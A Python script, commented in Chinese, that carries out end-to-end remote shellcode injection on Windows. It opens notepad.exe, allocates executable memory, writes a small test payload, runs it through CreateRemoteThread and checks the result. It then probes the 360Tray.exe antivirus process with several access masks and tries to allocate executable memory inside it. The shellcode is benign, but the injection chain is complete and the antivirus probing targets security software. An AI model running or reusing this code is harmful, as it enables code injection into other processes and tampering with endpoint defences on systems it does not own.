import ctypes, sys, subprocess, time, os
from ctypes import wintypes
sys.stdout.reconfigure(encoding='utf-8')
k=ctypes.windll.kernel32
k.OpenProcess.argtypes=[wintypes.DWORD,wintypes.BOOL,wintypes.DWORD]; k.OpenProcess.restype=wintypes.HANDLE
k.VirtualAllocEx.argtypes=[wintypes.HANDLE,wintypes.LPVOID,ctypes.c_size_t,wintypes.DWORD,wintypes.DWORD]; k.VirtualAllocEx.restype=wintypes.LPVOID
k.WriteProcessMemory.argtypes=[wintypes.HANDLE,wintypes.LPVOID,wintypes.LPCVOID,ctypes.c_size_t,ctypes.POINTER(ctypes.c_size_t)]; k.WriteProcessMemory.restype=wintypes.BOOL
k.CreateRemoteThread.argtypes=[wintypes.HANDLE,wintypes.LPVOID,ctypes.c_size_t,wintypes.LPVOID,wintypes.LPVOID,wintypes.DWORD,wintypes.LPVOID]; k.CreateRemoteThread.restype=wintypes.HANDLE
k.WaitForSingleObject.argtypes=[wintypes.HANDLE,wintypes.DWORD]
k.GetExitCodeThread.argtypes=[wintypes.HANDLE,ctypes.POINTER(wintypes.DWORD)]
k.CloseHandle.argtypes=[wintypes.HANDLE]

print("=== ★★★ 完整 shellcode 注入测试（端到端）===")
print()
# shellcode: 把 eax 设为 0x1337 然后返回 (ret)
# mov eax, 0x1337  = B8 37 13 00 00
# ret              = C3
sc = bytes([0xB8,0x37,0x13,0x00,0x00,0xC3])
print("  shellcode: %s  (mov eax,0x1337; ret)"%sc.hex(' '))
print()
p=subprocess.Popen(["notepad.exe"]); time.sleep(1.5)
pid=p.pid
print("  目标进程: notepad.exe PID %d"%pid)
h=k.OpenProcess(0x1F0FFF,False,pid)
print("  OpenProcess -> 0x%X"%h)
addr=k.VirtualAllocEx(h,None,4096,0x3000,0x40)
print("  VirtualAllocEx(RWX) -> 0x%X"%(addr or 0))
w=ctypes.c_size_t()
ok=k.WriteProcessMemory(h,addr,sc,len(sc),ctypes.byref(w))
print("  WriteProcessMemory -> %s (%d 字节)"%(bool(ok),w.value))
th=k.CreateRemoteThread(h,None,0,addr,None,0,None)
print("  ★ CreateRemoteThread -> 0x%X  %s"%(th or 0,'成功' if th else 'FAIL err=%d'%k.GetLastError()))
if th:
    k.WaitForSingleObject(th,5000)
    ec=wintypes.DWORD()
    k.GetExitCodeThread(th,ctypes.byref(ec))
    print("  ★ 远程线程退出码: 0x%X  (期望 0x1337)"%ec.value)
    print("  ★★★ 注入执行成功: %s"%(ec.value==0x1337))
    k.CloseHandle(th)
k.CloseHandle(h)
p.terminate()
print()
print("=== 对 360 进程注入（预期失败，因 OpenProcess 被拒）===")
out=subprocess.run(['tasklist','/fo','csv','/nh'],capture_output=True,text=True,encoding='utf-8',errors='replace').stdout
for line in out.splitlines():
    f=[x.strip('"') for x in line.split('","')]
    if len(f)>=2 and f[0]=='360Tray.exe':
        tpid=int(f[1]); break
else: tpid=None
if tpid:
    h2=k.OpenProcess(0x1F0FFF,False,tpid)
    print("  360Tray PID %d: OpenProcess(ALL) -> 0x%X %s"%(tpid,h2 or 0,'OK' if h2 else 'DENIED'))
    h3=k.OpenProcess(0x1000,False,tpid)
    print("  360Tray PID %d: OpenProcess(QUERY_LIMITED) -> 0x%X %s"%(tpid,h3 or 0,'OK' if h3 else 'DENIED'))
    if h3:
        # 用 QUERY_LIMITED 能否 VirtualAllocEx？需要 PROCESS_VM_OPERATION(0x8)
        h4=k.OpenProcess(0x1000|0x8,False,tpid)
        print("  360Tray: OpenProcess(QUERY_LIMITED|VM_OPERATION) -> 0x%X"%(h4 or 0))
        if h4:
            a2=k.VirtualAllocEx(h4,None,4096,0x3000,0x40)
            print("  ★ 对 360Tray VirtualAllocEx -> 0x%X %s"%(a2 or 0,'成功' if a2 else 'FAIL'))
